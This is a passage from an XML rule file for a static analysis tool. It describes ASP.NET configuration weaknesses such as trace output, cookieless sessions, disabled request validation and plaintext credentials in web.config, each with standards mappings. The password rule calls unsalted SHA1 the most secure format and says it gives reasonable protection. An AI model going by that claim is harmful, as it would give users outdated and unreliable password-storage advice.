							  <br>          ASP.NET Web services facilitate the development of Web services clients by automatically generating documentation that describes how to communicate with the Web service.<br><br>Web services that have the documentation protocol enabled generate an HTML-formatted page when a browser request is received.<br><br>This HTML-formatted page describes the following information:<br>1.  The operations that are supported<br>2.  The parameters that each operation accepts<br>3.  The type of data that should be passed in those parameters<br><br>The documentation protocol also generates an XML-formatted Web Services Description Language (WSDL) file. This file is designed to allow applications to understand how to structure requests to the Web service. This information can be very useful to developers, especially developers who create clients for public Web services. However, revealing detailed information about the functionality of private Web services increases the risk that the Web service will be misused by a malicious attacker. The Documentation protocol always describes all functions and parameters of a Web service -- even if only a subset of those functions are intended to be publicly accessible.<br>        
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A2 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[3]  <em>HOW TO: Disable the Documentation Protocol for ASP.NET Web Services</em> <br></p>
																									   <p>[4]  <em>HOW TO: Limit the Web Services Protocols that a Server Permits</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[6]  <em>Web Services Settings Schema</em> <br></p>
																									   <p>[7]  <em>Web.config</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_mime_sniffing</key>
    <internalKey>Environment/ASP.NET Misconfiguration/MIME Sniffing</internalKey>
    <name>ASP.NET Misconfiguration: MIME Sniffing</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The web.config file does not include the required header to mitigate MIME sniffing attacks
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  MIME sniffing, is the practice of inspecting the content of a byte stream to attempt to deduce the file format of the data within it.<br><br>If MIME sniffing is not explicitly disabled, some browsers can be manipulated into interpreting data in a way that is not intended, allowing for cross-site scripting attacks.<br><br>For each page that could contain user controllable content, you should use the HTTP Header <code>X-Content-Type-Options: nosniff</code>.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9]  <em>ASP.NET Configuration Files</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11]  <em>Custom HttpModule Example</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 554</em> <br></p>
																									   <p>[13]  <em>Global.asax Syntax</em> <br></p>
																									   <p>[14]  <em>HttpResponse Class</em> <br></p>
																									   <p>[15]  <em>IE8 Security Part V: Comprehensive Protection</em> <br></p>
																									   <p>[16] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[17]  <em>MIME types and stylesheets</em> <br></p>
																									   <p>[18]  <em>Reducing MIME type security risks</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[23] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_password_protection_disabled</key>
    <internalKey>Environment/ASP.NET Misconfiguration/Password Protection Disabled</internalKey>
    <name>ASP.NET Misconfiguration: Password Protection Disabled</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Storing a password in plaintext or using weak encryption could result in a system compromise.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  ASP.NET applications can store user name and password pairs in <code>&lt;credentials&gt;</code> elements in the <code>web.config</code> file for an ASP.NET application, which supports plaintext, MD5 and SHA1 password formats.<br><br>Passwords stored in plaintext or using a weak encryption algorithm are accessible to anyone with the access to the application's configuration files. This may include the machine where the application is hosted or the source code repository where the application lives.<br><br><b>Example 1:</b> The following <code>web.config</code>  entry incorrectly stores its passwords in plaintext.<br><br><pre><br>&lt;configuration&gt;<br>  &lt;system.web&gt;<br>    &lt;authentication&gt;<br>      &lt;forms protection="All"&gt;<br>	   &lt;credentials passwordFormat="Clear"&gt;<br>   		&lt;user name="user1" password="my_password"/&gt;<br>		&lt;user name="user2" password="my_password1"/&gt;<br>        &lt;/credentials&gt;<br>    	 &lt;/forms&gt;<br>    &lt;/authentication&gt;<br>  &lt;/system.web&gt;<br>&lt;/configuration&gt;<br></pre><br><br>ASP.NET supports credential passwords stored in three formats, specified by the <code>passwordFormat</code> attribute of the <code>configuration/system.web/authentication/forms/credentials</code> element. The possible values for this attribute are:<br><br><code>Clear</code> - indicates that the password is stored in plaintext (least secure)<br><code>MD5</code> - indicates that the password's MD5 hash is stored<br><code>SHA1</code> - indicates that the password's SHA1 hash is stored (most secure)<br><br>While an MD5 hash is more secure than plaintext, researchers have found brute-force attacks against the MD5 hashing algorithm. At this time, a SHA1 hash still provides reasonable protection against such attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em>.NET Framework General Reference: credentials Element</em> Microsoft Corporation<br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A7 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A8 Insecure Cryptographic Storage</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A8 Insecure Storage</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II, APP3340 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 260</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - FIPS200 - (FISMA) <em>MP</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 3.4, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.2.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 3.4, Requirement 6.5.3, Requirement 8.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 3.4, Requirement 6.5.8, Requirement 8.4</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-28 Protection of Information at Rest (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_request_validation_disabled</key>
    <internalKey>Environment/ASP.NET Misconfiguration/Request Validation Disabled</internalKey>
    <name>ASP.NET Misconfiguration: Request Validation Disabled</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Use the ASP.NET validation framework to prevent vulnerabilities that result from unchecked input.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Unchecked input is the leading cause of vulnerabilities in ASP.NET applications. Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others.<br><br>To prevent such attacks, use the ASP.NET validation framework to check all program input before it is processed by the application.<br><br>Example uses of the validation framework include checking to ensure that:<br><br>- Phone number fields contain only valid characters in phone numbers<br> - Boolean values are only "T" or "F"<br> - Free-form strings are of a reasonable length and composition
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9]  <em>Building Secure ASP.NET Pages and Controls</em> Microsoft<br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 554</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_request_validation_disabled_request_validation_disabled</key>
    <internalKey>Environment/ASP.NET Misconfiguration/Request Validation Disabled(request_validation_disabled)</internalKey>
    <name>ASP.NET Misconfiguration: Request Validation Disabled(request_validation_disabled)</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Use the ASP.NET validation framework to prevent vulnerabilities that result from unchecked input.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Unchecked input is the leading cause of vulnerabilities in ASP.NET applications. Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others.<br><br>To prevent such attacks, use the ASP.NET validation framework to check all program input before it is processed by the application.<br><br>Example uses of the validation framework include checking to ensure that:<br><br>- Phone number fields contain only valid characters in phone numbers<br> - Boolean values are only "T" or "F"<br> - Free-form strings are of a reasonable length and composition
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9]  <em>Building Secure ASP.NET Pages and Controls</em> Microsoft<br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 554</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_role_protection_disabled</key>
    <internalKey>Environment/ASP.NET Misconfiguration/Role Protection Disabled</internalKey>
    <name>ASP.NET Misconfiguration: Role Protection Disabled</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Unprotected role information in cookies could be viewed or modified by attackers.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If the <code>cacheRolesInCookie</code> attribute of the <code>configuration/system.web/authentication/forms</code> element in <code>web.config</code> is set to <code>true</code>, then the roles for each user are cached in a cookie. If this information is stored in plaintext, anyone with access to machines used to interact with the application will have access to the information stored in the cookie. Worse yet, if attackers are allowed to arbitrarily modify the data stored in cookies, they can falsify information provided to the application and potentially alter its behavior to their advantage.<br><br>In many cases, an application can validate input from cookies programmatically according to the context in which it is used, but the ASP.NET validation framework provides an excellent way to verify that the cookie has not been modified unexpectedly. Without this approach, it is difficult, and often impossible, to establish with a high level of confidence that all input is validated.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em>.NET Framework General Reference: CookieProtectionValue Property</em> Microsoft Corporation<br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[5] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3210.1 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 302</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_session_cookies_disabled</key>
    <internalKey>Environment/ASP.NET Misconfiguration/Session Cookies Disabled</internalKey>
    <name>ASP.NET Misconfiguration: Session Cookies Disabled</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program does not use cookies to transmit session identifiers, which can leave the door open to Session Fixation and Session Hijacking attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Most web applications use a session identifier to uniquely identify users, which is typically stored in a cookie and transmitted transparently between the server and the web browser.<br><br><br>When the value of the attribute is set to either <code>true</code> or <code>UseUri</code>, the application does not use cookies regardless of whether the browser or device supports cookies. When the value of the attribute is set to either <code>AutoDetect</code> or <code>UseDeviceProfile</code>, the cookies are not used depending on the configuration of the requesting browser or device.<br><br>Applications that do not store session identifiers in cookies sometimes transmit them as an HTTP request parameter or as part of the URL. Accepting session identifiers specified in URLs makes it easy for attackers to perform Session Fixation attacks.<br><br>Placing session identifiers in URLs can also increase the chances of successful Session Hijacking attacks against the application. Session Hijacking occurs when an attacker takes control of a victim's active session or session identifier. It is common practice for web servers, application servers, and web proxies to store requested URLs. If session identifiers are included in URLs, they are also logged. Increasing the number of places session identifiers are viewed and stored increases the chances they will be compromised by an attacker.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A2 Broken Authentication and Session Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A3 Broken Authentication and Session Management</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A7 Broken Authentication and Session Management</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3090 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3405 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3405 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3405 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3405 CAT I</em> <br></p>
																									   <p>[10]  <em>Cookieless ASP.NET</em> Microsoft<br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 384</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M9 Improper Session Handling</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-23 Session Authenticity (P1)</em> <br></p>
																									   <p>[18]  <em>Session Fixation</em> Fortify, An HP Company<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_trace_output</key>
    <internalKey>Environment/ASP.NET Misconfiguration/Trace Output</internalKey>
    <name>ASP.NET Misconfiguration: Trace Output</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Trace debug information helps attackers learn about the system and plan a form of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  ASP.NET applications can be configured to output trace debugging information. Trace output contains details about the request made to the current page, header information, methods and controls used on the page and the active session state. Attackers can leverage the additional information they gain from trace output to mount attacks targeted on the framework, database, or other resources used by the application.<br><br>Trace information is enabled at the page level by setting the <code>Trace</code> attribute of the <code>&lt;page&gt;</code> directive to <code>true</code> or on the application level by adding a <code>trace</code> element in the <code>web.config</code> file and setting its <code>enabled</code> attribute to <code>true</code>.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 11</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>
																									   <p>[19] Robert Walling <em>The Basics of .NET Tracing</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_use_of_impersonation_context</key>
    <internalKey>Environment/ASP.NET Misconfiguration/Use of Impersonation Context</internalKey>
    <name>ASP.NET Misconfiguration: Use of Impersonation Context</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Configuring an ASP.NET application to run with impersonated credentials might give the application unnecessary privileges.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The use of impersonated credentials allows an ASP.NET application to run with either the privileges of the client on whose behalf it is executing or with arbitrary privileges granted in its configuration.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.1 CAT II</em> <br></p>
																									   <p>[10]  <em>ASP.NET Impersonation</em> Microsoft<br></p>
																									   <p>[11] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 556</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authorization</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>environment</tag>
  </rule>
  <rule>
    <key>environment_asp_net_misconfiguration_weak_password_protection</key>
    <internalKey>Environment/ASP.NET Misconfiguration/Weak Password Protection</internalKey>
